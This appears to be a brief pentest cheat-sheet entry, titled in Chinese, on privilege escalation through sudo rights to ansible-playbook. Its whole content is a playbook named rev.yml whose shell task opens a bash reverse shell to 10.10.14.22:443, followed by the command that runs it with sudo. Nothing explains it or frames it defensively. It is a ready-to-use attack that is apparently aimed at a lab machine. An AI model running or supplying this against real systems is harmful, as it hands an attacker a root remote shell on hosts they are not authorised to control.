# ansible-playbook剧本提权

```bash
-----------------------rev.yml-------------------------------
- hosts: localhost
  tasks:
  - name: rev
    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.22/443 0>&1'
-----------------------rev.yml-------------------------------

sudo ansible-playbook rev.yml 
```

‍
